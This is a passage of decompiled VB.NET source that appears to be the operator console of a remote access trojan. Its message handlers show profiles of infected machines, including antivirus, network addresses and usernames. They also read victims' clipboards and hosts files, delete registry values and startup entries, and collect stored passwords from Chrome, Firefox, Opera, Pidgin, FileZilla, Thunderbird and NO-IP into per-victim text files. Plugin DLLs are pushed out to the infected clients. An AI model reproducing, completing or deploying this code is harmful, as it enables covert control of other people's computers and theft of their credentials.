                            If (Not My.Application.OpenForms.Item(("System Information" & strArray(2))) Is Nothing) Then
                                Me.s.Send(Conversions.ToInteger(strArray(2)), "Abort")
                            ElseIf Me.InvokeRequired Then
                                Dim _data25 As _data = New _data(AddressOf Me.data)
                                Me.Invoke(_data25, New Object() {sock, b})
                            Else
                                Dim information As New System_Information
                                information.sock = sock
                                information.Name = ("System Information" & strArray(2))
                                information.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("System Information : ", SocketServer.Decode(strArray(1))), " - "), Me.s.IP(sock)))
                                information.ToolStripStatusLabel2.Text = "Ready to any command!"
                                information.Show()
                            End If
                            Return
                        Case "System Details"
                            Dim information2 As System_Information = DirectCast(My.Application.OpenForms.Item(("System Information" & strArray(2))), System_Information)
                            If (strArray(1) = "Done!") Then
                                information2.CL.Enabled = True
                                information2.ListView1.Enabled = True
                                information2.ToolStripStatusLabel2.Text = "List of information successfully created"
                            Else
                                Dim num38 As Integer
                                If Me.InvokeRequired Then
                                    Dim _data26 As _data = New _data(AddressOf Me.data)
                                    Me.Invoke(_data26, New Object() {sock, b})
                                    Return
                                End If
                                Dim strArray29 As String() = Strings.Split(Conversions.ToString(clsCompressedString.Decode(strArray(1))), "Machine-Information", -1, CompareMethod.Binary)
                                information2.ListView1.Groups.Add("", "Client Information :")
                                information2.ListView1.Items.Add(New ListViewItem(New String() {("Client Location : " & strArray29(0))}, 0, information2.ListView1.Groups.Item((information2.ListView1.Groups.Count - 1))))
                                information2.ListView1.Items.Add(New ListViewItem(New String() {Conversions.ToString(Operators.ConcatenateObject("Client Identifier : ", SocketServer.Decode(strArray29(1))))}, 1, information2.ListView1.Groups.Item((information2.ListView1.Groups.Count - 1))))
                                information2.ListView1.Items.Add(New ListViewItem(New String() {("Client Country : " & Me.GeoIP.LookupCountryName(Me.s.IP(sock)))}, 2, information2.ListView1.Groups.Item((information2.ListView1.Groups.Count - 1))))
                                information2.ListView1.Groups.Add("", "Network Information :")
                                information2.ListView1.Items.Add(New ListViewItem(New String() {("WAN : " & Me.s.IP(sock))}, 3, information2.ListView1.Groups.Item((information2.ListView1.Groups.Count - 1))))
                                information2.ListView1.Items.Add(New ListViewItem(New String() {("LAN : " & strArray29(2))}, 4, information2.ListView1.Groups.Item((information2.ListView1.Groups.Count - 1))))
                                information2.ListView1.Items.Add(New ListViewItem(New String() {("MAC Address : " & strArray29(3))}, 5, information2.ListView1.Groups.Item((information2.ListView1.Groups.Count - 1))))
                                information2.ListView1.Groups.Add("", "Computer Specifications :")
                                information2.ListView1.Items.Add(New ListViewItem(New String() {("Operating System : " & strArray29(4))}, 6, information2.ListView1.Groups.Item((information2.ListView1.Groups.Count - 1))))
                                information2.ListView1.Items.Add(New ListViewItem(New String() {("Computer Name : " & strArray29(5))}, 7, information2.ListView1.Groups.Item((information2.ListView1.Groups.Count - 1))))
                                information2.ListView1.Items.Add(New ListViewItem(New String() {("Computer Username : " & strArray29(6))}, 8, information2.ListView1.Groups.Item((information2.ListView1.Groups.Count - 1))))
                                information2.ListView1.Items.Add(New ListViewItem(New String() {("Start Up Time : " & strArray29(7))}, 9, information2.ListView1.Groups.Item((information2.ListView1.Groups.Count - 1))))
                                If strArray29(&H1B).ToString.Contains("AVG") Then
                                    num38 = &H16
                                ElseIf strArray29(&H1B).ToString.Contains("Avira") Then
                                    num38 = &H17
                                ElseIf strArray29(&H1B).ToString.Contains("Bitdefender") Then
                                    num38 = &H18
                                ElseIf strArray29(&H1B).ToString.Contains("ESET") Then
                                    num38 = &H19
                                ElseIf strArray29(&H1B).ToString.Contains("Kaspersky") Then
                                    num38 = &H1A
                                ElseIf strArray29(&H1B).ToString.Contains("McAfee") Then
                                    num38 = &H1B
                                Else
                                    num38 = &H15
                                End If
                                information2.ListView1.Items.Add(New ListViewItem(New String() {("Antivirus : " & strArray29(&H1B))}, num38, information2.ListView1.Groups.Item((information2.ListView1.Groups.Count - 1))))
                                information2.ListView1.Items.Add(New ListViewItem(New String() {("Active Window : " & strArray29(8))}, 10, information2.ListView1.Groups.Item((information2.ListView1.Groups.Count - 1))))
                                information2.ListView1.Items.Add(New ListViewItem(New String() {("Screen Resolution " & strArray29(9))}, 11, information2.ListView1.Groups.Item((information2.ListView1.Groups.Count - 1))))
                                information2.ListView1.Items.Add(New ListViewItem(New String() {("Screens : " & strArray29(10))}, 12, information2.ListView1.Groups.Item((information2.ListView1.Groups.Count - 1))))
                                information2.ListView1.Items.Add(New ListViewItem(New String() {("N* Mouse Buttons : " & strArray29(11))}, 13, information2.ListView1.Groups.Item((information2.ListView1.Groups.Count - 1))))
                                information2.ListView1.Items.Add(New ListViewItem(New String() {("Mouse Speed : " & strArray29(12))}, 13, information2.ListView1.Groups.Item((information2.ListView1.Groups.Count - 1))))
                                information2.ListView1.Items.Add(New ListViewItem(New String() {("Keyboard Language : " & strArray29(13))}, 14, information2.ListView1.Groups.Item((information2.ListView1.Groups.Count - 1))))
                                information2.ListView1.Items.Add(New ListViewItem(New String() {("Keyboard Speed : " & strArray29(14))}, 14, information2.ListView1.Groups.Item((information2.ListView1.Groups.Count - 1))))
                                information2.ListView1.Items.Add(New ListViewItem(New String() {("Graphics Card : " & strArray29(&H11))}, &H10, information2.ListView1.Groups.Item((information2.ListView1.Groups.Count - 1))))
                                information2.ListView1.Items.Add(New ListViewItem(New String() {("Ram : " & SocketServer.GetSize(Conversions.ToULong(strArray29(&H12))))}, &H11, information2.ListView1.Groups.Item((information2.ListView1.Groups.Count - 1))))
                                information2.ListView1.Items.Add(New ListViewItem(New String() {("Free Ram : " & strArray29(&H13))}, &H11, information2.ListView1.Groups.Item((information2.ListView1.Groups.Count - 1))))
                                Dim num37 As Integer = 0
                                If (strArray29(&H15) = "Online") Then
                                    num37 = &H12
                                Else
                                    num37 = &H13
                                End If
                                information2.ListView1.Items.Add(New ListViewItem(New String() {("Battery : " & strArray29(20))}, num37, information2.ListView1.Groups.Item((information2.ListView1.Groups.Count - 1))))
                                information2.ListView1.Groups.Add("", "System Specifications :")
                                information2.ListView1.Items.Add(New ListViewItem(New String() {("Architecture : " & strArray29(&H16))}, 20, information2.ListView1.Groups.Item((information2.ListView1.Groups.Count - 1))))
                                information2.ListView1.Items.Add(New ListViewItem(New String() {("Platform : " & strArray29(&H17))}, 20, information2.ListView1.Groups.Item((information2.ListView1.Groups.Count - 1))))
                                information2.ListView1.Items.Add(New ListViewItem(New String() {("Version : " & strArray29(&H18))}, 20, information2.ListView1.Groups.Item((information2.ListView1.Groups.Count - 1))))
                                information2.ListView1.Items.Add(New ListViewItem(New String() {("Boot Mode : " & strArray29(&H19))}, 20, information2.ListView1.Groups.Item((information2.ListView1.Groups.Count - 1))))
                                information2.ListView1.Items.Add(New ListViewItem(New String() {("Freamwork Version : " & strArray29(&H1A))}, 20, information2.ListView1.Groups.Item((information2.ListView1.Groups.Count - 1))))
                                information2.ListView1.Groups.Add("", "BIOS Specifications :")
                                information2.ListView1.Items.Add(New ListViewItem(New String() {("BIOS Name : " & strArray29(15))}, 15, information2.ListView1.Groups.Item((information2.ListView1.Groups.Count - 1))))
                                information2.ListView1.Items.Add(New ListViewItem(New String() {("BIOS Speed : " & strArray29(&H10) & " Mhz")}, 15, information2.ListView1.Groups.Item((information2.ListView1.Groups.Count - 1))))
                                information2.ListView1.Items.Add(New ListViewItem(New String() {("BIOS Version : " & strArray29(&H1C))}, 15, information2.ListView1.Groups.Item((information2.ListView1.Groups.Count - 1))))
                                information2.ListView1.Items.Add(New ListViewItem(New String() {("BIOS Manufacturers : " & strArray29(&H1D))}, 15, information2.ListView1.Groups.Item((information2.ListView1.Groups.Count - 1))))
                                information2.ListView1.Items.Add(New ListViewItem(New String() {("BIOS Release date : " & strArray29(30))}, 15, information2.ListView1.Groups.Item((information2.ListView1.Groups.Count - 1))))
                            End If
                            Try
                                information2.ListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                            Catch exception78 As Exception
                            End Try
                            Return
                        Case "GAVN"
                            If Me.InvokeRequired Then
                                Dim _data27 As _data = New _data(AddressOf Me.data)
                                Me.Invoke(_data27, New Object() {sock, b})
                            Else
                                Dim information3 As System_Information = DirectCast(My.Application.OpenForms.Item(("System Information" & strArray(2))), System_Information)
                                If (strArray(1) = "ERR") Then
                                    information3.ToolStripStatusLabel11.Text = "Error : Couldn't get %% List!".Replace("%%", strArray(3))
                                    information3.AVRE.Enabled = True
                                Else
                                    information3.AVList.Enabled = False
                                    information3.CAVLIST.Enabled = True
                                    Dim strArray30 As String() = Strings.Split(Conversions.ToString(clsCompressedString.Decode(strArray(1))), "|", -1, CompareMethod.Binary)
                                    Dim num76 As Integer = (strArray30.Length - 2)
                                    Dim num39 As Integer = 0
                                    Do While (num39 <= num76)
                                        If strArray30(num39).Contains("Display Name") Then
                                            information3.AVList.Groups.Add("", (strArray30(num39).Replace("!+_+!Display Name", "") & " :"))
                                            Dim strArray31 As String() = Strings.Split(strArray30(num39), "!+_+!", -1, CompareMethod.Binary)
                                            information3.AVList.Items.Add(New ListViewItem(New String() {(strArray31(1) & " : "), strArray31(0)}, &H15, information3.AVList.Groups.Item((information3.AVList.Groups.Count - 1))))
                                            information3.AVList.Items.Add(New ListViewItem(New String() {"Type : ", strArray(3)}, &H15, information3.AVList.Groups.Item((information3.AVList.Groups.Count - 1))))
                                        Else
                                            Dim strArray32 As String() = Strings.Split(strArray30(num39), "!+_+!", -1, CompareMethod.Binary)
                                            information3.AVList.Items.Add(New ListViewItem(New String() {(strArray32(1) & " : "), strArray32(0)}, &H15, information3.AVList.Groups.Item((information3.AVList.Groups.Count - 1))))
                                        End If
                                        num39 += 1
                                    Loop
                                    information3.CAVLIST.Enabled = True
                                    information3.AVList.Enabled = True
                                    information3.ToolStripStatusLabel11.Text = "List of %% information successfully created".Replace("%%", strArray(3))
                                    information3.AVList.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                                End If
                            End If
                            Return
                        Case "GWL"
                            If Me.InvokeRequired Then
                                Dim _data28 As _data = New _data(AddressOf Me.data)
                                Me.Invoke(_data28, New Object() {sock, b})
                            Else
                                Dim information4 As System_Information = DirectCast(My.Application.OpenForms.Item(("System Information" & strArray(1))), System_Information)
                                Dim strArray33 As String() = Strings.Split(Conversions.ToString(clsCompressedString.Decode(strArray(2))), "|WI|", -1, CompareMethod.Binary)
                                Try
                                    Dim num77 As Integer = (strArray33.Length - 2)
                                    Dim num40 As Integer = 0
                                    Do While (num40 <= num77)
                                        Dim item36 As ListViewItem = information4.WIL.Items.Add(strArray33(num40), SocketServer.GWS(Conversions.ToInteger(strArray33((num40 + 1)))))
                                        item36.SubItems.Add((strArray33((num40 + 1)) & "%"))
                                        item36.SubItems.Add(strArray33((num40 + 2)))
                                        num40 = (num40 + 2)
                                        num40 += 1
                                    Loop
                                Catch exception79 As Exception
                                End Try
                                Try
                                    information4.WIL.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                                Catch exception80 As Exception
                                End Try
                            End If
                            Return
                        Case "WLS"
                            Dim information5 As System_Information = DirectCast(My.Application.OpenForms.Item(("System Information" & strArray(2))), System_Information)
                            If (strArray(1) = "Done") Then
                                information5.WIL.Enabled = True
                                information5.ToolStripStatusLabel9.Text = "List of wifi list successfully created"
                            ElseIf (strArray(1) = "Could not retrieve Wifi list") Then
                                information5.WIL.Enabled = True
                                information5.ToolStripStatusLabel9.Text = "Could not retrieve Wifi list"
                            Else
                                information5.ToolStripStatusLabel9.Text = strArray(1)
                            End If
                            Return
                    End Select
                    If (str13 <> "Getinstalledprograms") Then
                        GoTo Label_CD7E
                    End If
                    If Me.InvokeRequired Then
                        Dim _data29 As _data = New _data(AddressOf Me.data)
                        Me.Invoke(_data29, New Object() {sock, b})
                        Return
                    End If
                    information6 = DirectCast(My.Application.OpenForms.Item(("System Information" & strArray(2))), System_Information)
                    Dim strArray34 As String() = Strings.Split(Conversions.ToString(clsCompressedString.Decode(strArray(1))), "ProgramsPlugin", -1, CompareMethod.Binary)
                    If (strArray(1) = "Done") Then
                        information6.Listview4.Enabled = True
                        information6.ToolStripStatusLabel3.Text = ("List of installed programs successfully created , N* of programs : ( " & Conversions.ToString(information6.Listview4.Items.Count) & " )")
                        Return
                    End If
                    information6.ToolStripStatusLabel3.Text = "Please wait a moment ..."
                    Try
                        Dim num78 As Integer = (strArray34.Length - 1)
                        Dim num41 As Integer = 0
                        Do While (num41 <= num78)
                            If (My.Application.OpenForms.Item(("System Information" & strArray(2))) Is Nothing) Then
                                Exit Do
                            End If
                            If (information6.Listview4.FindItemWithText(strArray34((num41 + 0))) Is Nothing) Then
                                Dim item38 As ListViewItem = information6.Listview4.Items.Add(strArray34((num41 + 0)), 1)
                                item38.SubItems.Add(strArray34((num41 + 1)))
                                item38.SubItems.Add(strArray34((num41 + 4)))
                                item38.SubItems.Add(strArray34((num41 + 3)))
                                item38.SubItems.Add(strArray34((num41 + 2)))
                            End If
                            num41 = (num41 + 4)
                            num41 += 1
                        Loop
                    Catch exception81 As Exception
                    End Try
                    Exit Select
            End Select
            Try
                information6.Listview4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
            Catch exception82 As Exception
            End Try
            Return
Label_CD7E:
            Select Case str13
                Case "GetClipboard"
                    Dim information7 As System_Information = DirectCast(My.Application.OpenForms.Item(("System Information" & strArray(3))), System_Information)
                    information7.Textc.Text = ""
                    information7.Textc.Text = Conversions.ToString(SocketServer.Decode(strArray(1)))
                    information7.ToolStripStatusLabel4.Text = strArray(2)
                    Return
                Case "Clipboard Result"
                    Dim information8 As System_Information = DirectCast(My.Application.OpenForms.Item(("System Information" & strArray(3))), System_Information)
                    information8.ToolStripStatusLabel4.Text = Conversions.ToString(Operators.ConcatenateObject(SocketServer.Decode(strArray(1)), strArray(2)))
                    Return
                Case "Clipboard C"
                    Dim information9 As System_Information = DirectCast(My.Application.OpenForms.Item(("System Information" & strArray(2))), System_Information)
                    information9.ToolStripStatusLabel4.Text = strArray(1)
                    Return
                Case "GetStartupFiles"
                    Dim information10 As System_Information = DirectCast(My.Application.OpenForms.Item(("System Information" & strArray(2))), System_Information)
                    Dim strArray35 As String() = Strings.Split(Conversions.ToString(clsCompressedString.Decode(strArray(1))), "|-", -1, CompareMethod.Binary)
                    Dim num79 As Integer = (strArray35.Length - 2)
                    Dim num42 As Integer = 0
                    Do While (num42 <= num79)
                        information10.ListView3.Items.Add(strArray35(num42), 0)
                        num42 += 1
                    Loop
                    information10.ListView3.Enabled = True
                    information10.ToolStripStatusLabel6.Text = "List of files successfully created"
                    Return
                Case "RemoveFromSList"
                    Dim information11 As System_Information = DirectCast(My.Application.OpenForms.Item(("System Information" & strArray(3))), System_Information)
                    If Operators.ConditionalCompareObjectEqual(SocketServer.Decode(strArray(2)), "R", False) Then
                        Dim enumerator33 As IEnumerator
                        Try
                            enumerator33 = information11.ListView3.Items.GetEnumerator
                            Do While enumerator33.MoveNext
                                Dim item39 As ListViewItem = DirectCast(enumerator33.Current, ListViewItem)
                                If Operators.ConditionalCompareObjectEqual(item39.SubItems.Item(0).Text, SocketServer.Decode(strArray(1)), False) Then
                                    information11.ToolStripStatusLabel6.Text = Conversions.ToString(Operators.ConcatenateObject("File has been successfully deleted : ", SocketServer.Decode(strArray(1))))
                                    item39.Remove()
                                    Return
                                End If
                            Loop
                        Finally
                        End Try
                    Else
                        information11.ToolStripStatusLabel6.Text = Conversions.ToString(Operators.ConcatenateObject("Could not delete this file : ", SocketServer.Decode(strArray(1))))
                    End If
                    Return
                Case "GSV"
                    If Me.InvokeRequired Then
                        Dim _data30 As _data = New _data(AddressOf Me.data)
                        Me.Invoke(_data30, New Object() {sock, b})
                    Else
                        Dim information12 As System_Information = DirectCast(My.Application.OpenForms.Item(("System Information" & strArray(2))), System_Information)
                        Dim strArray36 As String() = Strings.Split(Conversions.ToString(SocketServer.Decode(strArray(1))), "|", -1, CompareMethod.Binary)
                        Dim num80 As Integer = (strArray36.Length - 2)
                        Dim num43 As Integer = 0
                        Do While (num43 <= num80)
                            Dim item40 As ListViewSubItem = information12.ListView2.Items.Add(strArray36(num43), 0).SubItems.Add(strArray36((num43 + 1)))
                            num43 += 1
                            num43 += 1
                        Loop
                        information12.ListView2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                        information12.ListView2.Enabled = True
                        information12.ToolStripStatusLabel5.Text = "List of values successfully created"
                    End If
                    Return
                Case "DeleteReg"
                    Dim information13 As System_Information = DirectCast(My.Application.OpenForms.Item(("System Information" & strArray(3))), System_Information)
                    If (strArray(2) = "R") Then
                        Dim enumerator34 As IEnumerator
                        Try
                            enumerator34 = information13.ListView2.Items.GetEnumerator
                            Do While enumerator34.MoveNext
                                Dim item41 As ListViewItem = DirectCast(enumerator34.Current, ListViewItem)
                                If Operators.ConditionalCompareObjectEqual(item41.SubItems.Item(0).Text, SocketServer.Decode(strArray(1)), False) Then
                                    information13.ToolStripStatusLabel5.Text = Conversions.ToString(Operators.ConcatenateObject("Value has been successfully deleted : ", SocketServer.Decode(strArray(1))))
                                    item41.Remove()
                                    Return
                                End If
                            Loop
                        Finally
                        End Try
                    ElseIf (strArray(2) = "F") Then
                        information13.ToolStripStatusLabel5.Text = Conversions.ToString(Operators.ConcatenateObject("Could not delete this Value : ", SocketServer.Decode(strArray(1))))
                    End If
                    Return
            End Select
            Select Case str13
                Case "ReadHostsFile"
                    Dim information14 As System_Information = DirectCast(My.Application.OpenForms.Item(("System Information" & strArray(2))), System_Information)
                    information14.HostsText.Text = Conversions.ToString(clsCompressedString.Decode(strArray(1)))
                    information14.HostsText.Enabled = True
                    information14.UpdateHost.Enabled = True
                    information14.CHostsList.Enabled = True
                    information14.RHostsList.Enabled = True
                    information14.ToolStripStatusLabel7.Text = "Hosts File successfully created"
                    Return
                Case "OpenPasswords"
                    If (Not My.Application.OpenForms.Item(("OpenPasswords" & strArray(3))) Is Nothing) Then
                        Me.s.Send(Conversions.ToInteger(strArray(3)), (Me.Key & "Abort"))
                    ElseIf Me.InvokeRequired Then
                        Dim _data31 As _data = New _data(AddressOf Me.data)
                        Me.Invoke(_data31, New Object() {sock, b})
                    Else
                        Dim passwords As New Passwords
                        passwords.Sock = sock
                        passwords.Name = ("OpenPasswords" & strArray(3))
                        passwords.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("Passwords : ", SocketServer.Decode(strArray(1))), " - "), Me.s.IP(sock)))
                        passwords.ToolStripStatusLabel2.Text = strArray(2)
                        passwords.Path = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((Application.StartupPath & "\Users\"), SocketServer.Decode(strArray(1))), "\Passwords\"))
                        passwords.Show()
                    End If
                    Return
                Case "Paaswords"
                    Dim passwords4 As Passwords
                    Dim passwords2 As Passwords = DirectCast(My.Application.OpenForms.Item(("OpenPasswords" & strArray(5))), Passwords)
                    If (strArray(4) = "Chorme") Then
                        Dim item42 As ListViewItem = passwords2.ListView1.Items.Add(New ListViewItem(New String() {Conversions.ToString(SocketServer.Decode(strArray(1)))}, 0))
                        NewLateBinding.LateCall(item42.SubItems, Nothing, "Add", New Object() {RuntimeHelpers.GetObjectValue(SocketServer.Decode(strArray(2)))}, Nothing, Nothing, Nothing, True)
                        NewLateBinding.LateCall(item42.SubItems, Nothing, "Add", New Object() {RuntimeHelpers.GetObjectValue(SocketServer.Decode(strArray(3)))}, Nothing, Nothing, Nothing, True)
                    End If
                    If (strArray(4) = "Firefox") Then
                        Dim item43 As ListViewItem = passwords2.ListView1.Items.Add(New ListViewItem(New String() {Conversions.ToString(SocketServer.Decode(strArray(1)))}, 4))
                        NewLateBinding.LateCall(item43.SubItems, Nothing, "Add", New Object() {RuntimeHelpers.GetObjectValue(SocketServer.Decode(strArray(2)))}, Nothing, Nothing, Nothing, True)
                        NewLateBinding.LateCall(item43.SubItems, Nothing, "Add", New Object() {RuntimeHelpers.GetObjectValue(SocketServer.Decode(strArray(3)))}, Nothing, Nothing, Nothing, True)
                    End If
                    If (strArray(4) = "Opera") Then
                        Dim item44 As ListViewItem = passwords2.ListView1.Items.Add(New ListViewItem(New String() {Conversions.ToString(SocketServer.Decode(strArray(1)))}, 1))
                        NewLateBinding.LateCall(item44.SubItems, Nothing, "Add", New Object() {RuntimeHelpers.GetObjectValue(SocketServer.Decode(strArray(2)))}, Nothing, Nothing, Nothing, True)
                        NewLateBinding.LateCall(item44.SubItems, Nothing, "Add", New Object() {RuntimeHelpers.GetObjectValue(SocketServer.Decode(strArray(3)))}, Nothing, Nothing, Nothing, True)
                    End If
                    If (strArray(4) = "Pidgin") Then
                        passwords4 = passwords2
                        passwords4.CountGroupPidgin += 1
                        Dim item45 As ListViewItem = passwords2.ListView1.Items.Add(New ListViewItem(New String() {Conversions.ToString(SocketServer.Decode(strArray(1)))}, 2))
                        NewLateBinding.LateCall(item45.SubItems, Nothing, "Add", New Object() {RuntimeHelpers.GetObjectValue(SocketServer.Decode(strArray(2)))}, Nothing, Nothing, Nothing, True)
                        NewLateBinding.LateCall(item45.SubItems, Nothing, "Add", New Object() {RuntimeHelpers.GetObjectValue(SocketServer.Decode(strArray(3)))}, Nothing, Nothing, Nothing, True)
                    End If
                    If (strArray(4) = "FileZilla") Then
                        passwords4 = passwords2
                        passwords4.CountGroupFileZilla += 1
                        Dim item46 As ListViewItem = passwords2.ListView1.Items.Add(New ListViewItem(New String() {Conversions.ToString(SocketServer.Decode(strArray(1)))}, 3))
                        NewLateBinding.LateCall(item46.SubItems, Nothing, "Add", New Object() {RuntimeHelpers.GetObjectValue(SocketServer.Decode(strArray(2)))}, Nothing, Nothing, Nothing, True)
                        NewLateBinding.LateCall(item46.SubItems, Nothing, "Add", New Object() {RuntimeHelpers.GetObjectValue(SocketServer.Decode(strArray(3)))}, Nothing, Nothing, Nothing, True)
                    End If
                    If (strArray(4) = "Mozilla Thunderbird") Then
                        passwords4 = passwords2
                        passwords4.CountGroupFireFox += 1
                        Dim item47 As ListViewItem = passwords2.ListView1.Items.Add(New ListViewItem(New String() {Conversions.ToString(SocketServer.Decode(strArray(1)))}, 6))
                        NewLateBinding.LateCall(item47.SubItems, Nothing, "Add", New Object() {RuntimeHelpers.GetObjectValue(SocketServer.Decode(strArray(2)))}, Nothing, Nothing, Nothing, True)
                        NewLateBinding.LateCall(item47.SubItems, Nothing, "Add", New Object() {RuntimeHelpers.GetObjectValue(SocketServer.Decode(strArray(3)))}, Nothing, Nothing, Nothing, True)
                    End If
                    If (strArray(4) = "NO-IP") Then
                        Dim buffer5 As Byte() = Convert.FromBase64String(Conversions.ToString(SocketServer.Decode(strArray(2))))
                        Dim str11 As String = Encoding.ASCII.GetString(buffer5)
                        Dim item48 As ListViewItem = passwords2.ListView1.Items.Add(New ListViewItem(New String() {"NO-IP"}, 5))
                        NewLateBinding.LateCall(item48.SubItems, Nothing, "Add", New Object() {RuntimeHelpers.GetObjectValue(SocketServer.Decode(strArray(1)))}, Nothing, Nothing, Nothing, True)
                        item48.SubItems.Add(str11)
                    End If
                    passwords2.ListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                    Return
                Case "PasswordsResult"
                    Dim passwords3 As Passwords = DirectCast(My.Application.OpenForms.Item(("OpenPasswords" & strArray(2))), Passwords)
                    passwords3.ToolStripStatusLabel2.Text = strArray(1)
                    passwords3.ToolStripStatusLabel1.Text = (" -   Passwords: " & Conversions.ToString(passwords3.ListView1.Items.Count))
                    If (passwords3.ListView1.Items.Count > 0) Then
                        Try
                            Dim enumerator35 As IEnumerator
                            Try
                                enumerator35 = passwords3.ListView1.Items.GetEnumerator
                                Do While enumerator35.MoveNext
                                    Dim item49 As ListViewItem = DirectCast(enumerator35.Current, ListViewItem)
                                    My.Computer.FileSystem.WriteAllText(String.Concat(New String() {passwords3.Path, passwords3.T, "-", passwords3.TH, ".txt"}), String.Concat(New String() {"URL : ", item49.SubItems.Item(0).Text, ChrW(13) & ChrW(10) & "User : ", item49.SubItems.Item(1).Text, ChrW(13) & ChrW(10) & "Pass  : ", item49.SubItems.Item(2).Text, ChrW(13) & ChrW(10)}), True)
                                Loop
                            Finally
                            End Try
                        Catch exception83 As Exception
                        End Try
                    End If
                    Return
                Case "OpenScript"
                    If (Not My.Application.OpenForms.Item(("OpenScript" & strArray(3))) Is Nothing) Then
                        Me.s.Send(Conversions.ToInteger(strArray(3)), "Abort")
                    ElseIf Me.InvokeRequired Then
                        Dim _data32 As _data = New _data(AddressOf Me.data)
                        Me.Invoke(_data32, New Object() {sock, b})
                    Else
                        Dim script As New Script
                        script.sock = sock
                        script.Name = ("OpenScript" & strArray(3))
                        script.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("Scripts Manager : ", SocketServer.Decode(strArray(1))), " - "), Me.s.IP(sock)))
                        script.Show()
                    End If
                    Return
                Case "SCS"
                    Dim script2 As Script = DirectCast(My.Application.OpenForms.Item(("OpenScript" & strArray(2))), Script)
                    script2.ToolStripStatusLabel1.Text = Conversions.ToString(Operators.ConcatenateObject("Status : ", SocketServer.Decode(strArray(1))))
                    If strArray(3).ToString.Contains("Visual Basic") Then
                        script2.CNET.Enabled = True
                    ElseIf strArray(3).Contains("CSharp") Then
                        script2.CSharpc.Enabled = True
                    ElseIf strArray(3).Contains("Batch") Then
                        script2.EX.Enabled = True
                    ElseIf strArray(3).Contains("Autiot") Then
                        script2.CAUT.Enabled = True
                    ElseIf strArray(3).Contains("IL") Then
                        script2.ILB.Enabled = True
                    ElseIf strArray(3).Contains("PS") Then
                        script2.RVPS.Enabled = True
                    ElseIf strArray(3).Contains("AHK") Then
                        script2.AHKB.Enabled = True
                    End If
                    Return
                Case "SCE"
                    Dim script3 As Script = DirectCast(My.Application.OpenForms.Item(("OpenScript" & strArray(2))), Script)
                    script3.ToolStripStatusLabel1.Text = Conversions.ToString(Operators.ConcatenateObject("Status : Error : ", SocketServer.Decode(strArray(1))))
                    If (strArray(3) = "Batch") Then
                        script3.EX.Enabled = True
                    ElseIf strArray(3).Contains("Autiot") Then
                        script3.CAUT.Enabled = True
                    ElseIf strArray(3).Contains("IL") Then
                        script3.ILB.Enabled = True
                    ElseIf strArray(3).Contains("PS") Then
                        script3.RVPS.Enabled = True
                    ElseIf strArray(3).Contains("AHK") Then
                        script3.AHKB.Enabled = True
                    Else
                        script3.ToolStripStatusLabel1.Text = "Status : Error"
                        Dim strArray37 As String() = Strings.Split(Conversions.ToString(SocketServer.Decode(strArray(1))), "|+|", -1, CompareMethod.Binary)
                        If (strArray(3) = "Visual Basic .NET") Then
                            script3.CNET.Enabled = True
                            script3.Fxlsv1.Items.Clear()
                        Else
                            script3.CSharpc.Enabled = True
                            script3.Fxlsv2.Items.Clear()
                        End If
                        Dim num81 As Integer = (strArray37.Length - 2)
                        Dim num44 As Integer = 0
                        Do While (num44 <= num81)
                            Dim item50 As ListViewItem
                            If (strArray(3) = "Visual Basic .NET") Then
                                item50 = script3.Fxlsv1.Items.Add(strArray37(num44), 0)
                                item50.SubItems.Add(Conversions.ToString(CInt((num44 + 1))))
                                item50.SubItems.Add(Conversions.ToString(CInt((num44 + 2))))
                                num44 = (num44 + 2)
                            Else
                                item50 = script3.Fxlsv2.Items.Add(strArray37(num44), 0)
                                item50.SubItems.Add(Conversions.ToString(CInt((num44 + 1))))
                                item50.SubItems.Add(Conversions.ToString(CInt((num44 + 2))))
                                num44 = (num44 + 2)
                            End If
                            num44 += 1
                        Loop
                    End If
                    Return
                Case "GPL"
                    If ((strArray(1) = "FM") AndAlso File.Exists((Application.StartupPath & "\Plugin\FM.dll"))) Then
                        Me.s.Send(sock, String.Concat(New String() {"LP", Me.Key, "FM", Me.Key, "FM", Me.Key, Convert.ToBase64String(File.ReadAllBytes((Application.StartupPath & "\Plugin\FM.dll"))), Me.Key, Conversions.ToString(sock), Me.Key, Conversions.ToString(True), Me.Key, strArray(2), Me.Key, strArray(3)}))
                    End If
                    If ((strArray(1) = "RD") AndAlso File.Exists((Application.StartupPath & "\Plugin\RD.dll"))) Then
                        Me.s.Send(sock, String.Concat(New String() {"LP", Me.Key, "RD", Me.Key, "RD", Me.Key, Convert.ToBase64String(File.ReadAllBytes((Application.StartupPath & "\Plugin\RD.dll"))), Me.Key, Conversions.ToString(sock), Me.Key, Conversions.ToString(True), Me.Key, strArray(2), Me.Key, strArray(3)}))
                    End If
                    If ((strArray(1) = "RW") AndAlso File.Exists((Application.StartupPath & "\Plugin\RW.dll"))) Then
                        Me.s.Send(sock, String.Concat(New String() {"LP", Me.Key, "RW", Me.Key, "RW", Me.Key, Convert.ToBase64String(File.ReadAllBytes((Application.StartupPath & "\Plugin\RW.dll"))), Me.Key, Conversions.ToString(sock), Me.Key, Conversions.ToString(True), Me.Key, strArray(2), Me.Key, strArray(3)}))
                    End If
                    If ((strArray(1) = "SM") AndAlso File.Exists((Application.StartupPath & "\Plugin\SM.dll"))) Then
                        Me.s.Send(sock, String.Concat(New String() {"LP", Me.Key, "SM", Me.Key, "SM", Me.Key, Convert.ToBase64String(File.ReadAllBytes((Application.StartupPath & "\Plugin\SM.dll"))), Me.Key, Conversions.ToString(sock), Me.Key, Conversions.ToString(True), Me.Key, strArray(2), Me.Key, strArray(3)}))
                    End If
                    If ((strArray(1) = "PA") AndAlso File.Exists((Application.StartupPath & "\Plugin\PA.dll"))) Then
